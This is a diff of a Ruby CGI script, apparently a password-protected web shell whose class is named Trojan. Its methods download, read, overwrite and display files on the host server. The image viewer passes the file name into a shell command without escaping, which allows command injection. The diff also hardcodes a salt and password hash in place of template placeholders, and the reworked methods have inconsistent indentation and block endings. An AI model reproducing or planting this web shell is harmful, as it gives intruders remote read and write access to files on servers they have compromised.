@@ -51,74 +51,71 @@ class Trojan
         self.send_response
     end
 
-    ##########################################################################
-    # Payload functions are from here downward
-    ##########################################################################
-    def payload_file_down json
-        Dir.chdir @cwd
-        dl_file = json['args[file]'].first
+    def payload_feh json
+    Dir.chdir @cwd
+    img_file = json['args[file]'].first
 
-        if File.exist? dl_file
-            puts @cgi.header(
-                'Content-Disposition'       => 'attachment; filename=' + File.basename(dl_file),
-                'Content-Transfer-Encoding' => 'binary',
-            );
-            puts File.read(dl_file)
-        else
-            puts "File does not exist"
-        end
+    if File.readable? img_file
+        mime_type = `file --mime-type -b #{img_file}`.strip!
+        puts @cgi.header("Content-Type: #{mime_type}")
+        puts File.read(img_file)
+    else
+        puts 'File does not exist.'
+    end
+    exit
+end
+def payload_file_down json
+    Dir.chdir @cwd
+    dl_file = json['args[file]'].first
+
+    if File.exist? dl_file
+        puts @cgi.header(
+            'Content-Disposition'       => 'attachment; filename=' + File.basename(dl_file),
+            'Content-Transfer-Encoding' => 'binary',
+        );
+        puts File.read(dl_file)
+    else
+        puts "File does not exist"
+    end
+end
+
+def payload_file_read json
+    Dir.chdir @cwd
+    dl_file = json['args[file]'].first
+
+    unless File.readable? dl_file
+        @response['error'] = 'File is not readable or does not exist.'
+    else
+        @response['output'] = {
+            'output' => File.read(dl_file),
+            'file'   => File.realpath(dl_file),
+        }
     end
 
-    def payload_file_read json
-        Dir.chdir @cwd
-        dl_file = json['args[file]'].first
+    self.send_response
+end
 
-        unless File.readable? dl_file
-            @response['error'] = 'File is not readable or does not exist.'
-        else
-            @response['output'] = {
-                'output' => File.read(dl_file),
-                'file'   => File.realpath(dl_file),
-            }
-        end
+def payload_file_write json
+    Dir.chdir @cwd
+    write_file = json['args[file]'].first
 
-        self.send_response
+    if File.writable? write_file
+        File.open(write_file, 'w') {|f| f.write(json['args[data]'].first) }
+        @response['output'] = 'Write successful'
+    else
+        @response['error'] = 'Failed. File may not be writable, or may not exist.'
     end
+    self.send_response
+end
 
-    def payload_file_write json
-        Dir.chdir @cwd
-        write_file = json['args[file]'].first
-
-        if File.writable? write_file
-            File.open(write_file, 'w') {|f| f.write(json['args[data]'].first) }
-            @response['output'] = 'Write successful'
-        else
-            @response['error'] = 'Failed. File may not be writable, or may not exist.'
-        end
-        self.send_response
-    end
-
-    def payload_image_view json
-        Dir.chdir @cwd
-        img_file = json['args[file]'].first
-
-        if File.readable? img_file
-            mime_type = `file --mime-type -b #{img_file}`.strip!
-            puts @cgi.header("Content-Type: #{mime_type}")
-            puts File.read(img_file)
-        else
-            puts 'File does not exist.'
-        end
-        exit
-    end
 end
 
 # ---------- Procedural code starts here ----------
 
 cgi  = CGI.new
 
-hash = Digest::SHA1.hexdigest(cgi.params['args[password]'].first + '<%= locks[:two][:salt] %>')
-if hash.eql? '<%= locks[:two][:hash] %>'
+hash = Digest::SHA1.hexdigest(cgi.params['args[password]'].first + '7474b1554c')
+if hash.eql? '8bc32f6888c6794980bc31c1890a95a7538c5a63'
     session = CGI::Session.new(
         cgi,
         'database_manager' => CGI::Session::PStore,
